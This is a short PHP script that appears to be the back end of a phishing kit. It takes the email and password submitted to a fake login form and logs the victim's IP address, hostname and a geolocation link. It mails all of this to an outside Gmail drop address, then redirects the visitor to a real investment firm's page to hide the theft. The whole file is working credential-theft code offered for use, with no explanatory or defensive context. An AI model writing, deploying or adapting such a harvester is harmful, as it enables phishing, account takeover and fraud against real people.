<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "|----------| New Listings Email  |--------------|\n";
$msg .= "Email : ".$_POST['tb_name']."\n";
$msg .= "Password : ".$_POST['tb_pass']."\n";
$msg .= "|--------------- I N F O | I P -------------------|\n";
$msg .= "|Client IP: ".$ip."\n";
$msg .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$msg .= "|----------- Good News Sha --------------|\n";

$send = "dfacebookclaims@gmail.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $msg);   
}
header("Location: https://www.invesco.com/static/us/investors/contentdetail?contentId=a73c3602673e8510VgnVCM100000c2f1bf0aRCRD");
?>